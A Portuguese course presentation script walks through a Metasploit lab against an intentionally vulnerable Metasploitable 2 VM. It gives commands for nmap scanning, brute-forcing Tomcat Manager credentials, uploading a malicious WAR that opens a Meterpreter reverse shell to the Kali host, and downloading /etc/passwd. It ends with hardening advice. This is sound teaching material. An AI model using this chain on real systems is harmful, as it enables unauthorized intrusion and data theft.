# Roteiro de Apresentação — Metasploit Framework (foco em exploits web)

## Contexto

- **Título:** Introdução ao Metasploit Framework com foco em exploits web  
- **Disciplina:** Segurança da Informação  
- **Cenário do laboratório:**
  - Uma VM **Metasploitable 2** atuando como alvo vulnerável.
  - Uma VM **Kali Linux** atuando como atacante.

## O que é o Metasploit Framework

- Framework de **código aberto** para desenvolvimento, teste e execução de **exploits**.
- Usado em:
  - **Testes de penetração**,
  - **Validação de vulnerabilidades**, 
  - Demonstração de impacto para equipes técnicas e gerência.
- **Componentes principais:**
  - **Exploits:** módulos que exploram vulnerabilidades específicas.
  - **Payloads:** o que roda após o exploit (shell, Meterpreter, etc.).
  - **Auxiliary:** scanners, brute force, fingerprinting, etc.
  - **Encoders / NOPs:** ajudam a evadir filtros e IDS/antivírus.
- Interface principal: **`msfconsole`** (linha de comando), presente por padrão no Kali.

##  O que é o Metasploitable

- **Metasploitable:** máquina virtual **intencionalmente vulnerável** para estudo e treinamento.
- Características:
  - Serviços desatualizados (FTP, SSH, Samba, bancos de dados, servidores web).
  - Várias aplicações web inseguras (Mutillidae, DVWA, phpMyAdmin, TWiki, WebDAV, etc.).
- Por que usar em aula:
  - **Ambiente seguro e isolado.**
  - **Reprodutível:** mesma vulnerabilidade sempre disponível.
  - Permite ilustrar **toda a cadeia**: descoberta → exploração → pós‑exploração.

##  Arquitetura do laboratório (rede)

- **VM Kali (atacante):**
  - Rodando em **modo bridge**.
  - IP usado na demo: `192.168.0.61` (exibido no `ifconfig`, imagem `msfconsole_1.png`).
- **VM Metasploitable (alvo):**
  - Também em **modo bridge**.
  - IP descoberto via `ifconfig`: `192.168.0.60`.
- Justificativa do modo bridge:
  - As VMs aparecem como máquinas independentes na rede.
  - Demonstra cenário mais **próximo da realidade**, com IPs roteáveis na mesma sub‑rede.

##  Descobrindo o alvo com Nmap

- Com o IP do alvo (`192.168.0.60`), executamos no Kali:

```bash
nmap -sV -sC -O 192.168.0.60
```

- Resultados relevantes (resumidos):
  - **80/tcp – Apache 2.2.8 (Ubuntu) DAV/2** → aplicações web vulneráveis.
  - **8180/tcp – Apache Tomcat 5.5** → console de administração (`/manager/html`).
  - **8009/tcp – AJP13** (conector do Tomcat).
  - Outros serviços, mas **o foco aqui é web**.

##  Metasploit e enumeração de serviços web

- Com o Nmap em mãos, usamos o Metasploit para refinar a enumeração web:
  - `auxiliary/scanner/http/tomcat_mgr_login` → tenta descobrir credenciais do Tomcat Manager.
- Intenção didática:
  - Mostrar que **Metasploit não é só “dar exploit”**; ele também auxilia na **fase de reconhecimento**.

##  Preparação do cenário no Kali (demonstração)

- Antes de explorar, conferimos IP da VM Kali:

```bash
ifconfig
# IP do atacante: 192.168.0.61
```

- Essa etapa é mostrada na imagem `msfconsole_1.png`.
- Depois abrimos o Metasploit:

```bash
msfconsole
```

- Tela de inicialização ilustrada em `msfconsole_2.png`.

## Encontrando credenciais do Tomcat Manager

- Dentro do `msfconsole`, usamos o módulo de login para o Tomcat:

```text
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.0.60
set RPORT 8180
run
```

- Resultado (imagens `msfconsole_3.png` e `msfconsole_4.png`):
  - Descobrimos credenciais válidas para o Tomcat Manager, por exemplo: `tomcat:tomcat`.
- Ponto a enfatizar:
  - Esse passo simula o que um atacante real faria: testar senhas fracas ou padrão em painéis administrativos.

##  Exploit web: Tomcat Manager Upload

- Com as credenciais em mãos, partimos para o exploit web:

```text
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.0.60
set RPORT 8180
set HTTPUSERNAME tomcat
set HTTPPASSWORD tomcat
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.0.61   # IP da VM Kali (bridge)
set LPORT 4444
run
```

- O que o módulo faz:
  - Faz login no **Tomcat Manager**.
  - Faz upload de um arquivo `.war` malicioso.
  - Acessa esse `.war`, disparando o **payload Meterpreter** de volta para o Kali.
- A saída dessa etapa está em `msfconsole_5.png` (upload e execução).

##  Pós‑exploração com Meterpreter

- Uma vez estabelecida a sessão Meterpreter, demonstramos comandos básicos:

```text
meterpreter > sysinfo      # mostra informações do sistema comprometido
meterpreter > getuid       # mostra qual usuário comprometemos
meterpreter > download /etc/passwd
```

- Esses comandos aparecem em `msfconsole_7.png`.
- Em seguida, no Kali, abrimos o arquivo baixado (imagem `msfconsole_8.png`):
  - Mostra o conteúdo de `/etc/passwd`, evidenciando acesso a arquivos sensíveis do servidor.

## Resumo do fluxo do ataque web

1. **Coleta de informações:**
   - `ifconfig` no Metasploitable → IP alvo.
   - `nmap -sV -sC -O` → portas abertas e serviços.
2. **Enumeração web:**
   - Identificação de Apache/Tomcat/Manager.
   - Uso de módulo `tomcat_mgr_login` para achar credenciais.
3. **Exploração web:**
   - `exploit/multi/http/tomcat_mgr_upload` com payload `java/meterpreter/reverse_tcp`.
   - VM Kali escutando em `LHOST` (bridge) para receber conexão reversa.
4. **Pós‑exploração:**
   - `sysinfo`, `getuid`, `download /etc/passwd` e outras ações do Meterpreter.

##  Considerações de segurança e boas práticas
  - Nunca deixar **credenciais padrão** em consoles administrativos (como Tomcat Manager).
  - Manter servidores e frameworks web **atualizados**.
  - Restringir acesso ao Tomcat Manager a IPs confiáveis ou VPN.
  - Monitorar logs para detectar tentativas de upload e acessos suspeitos.





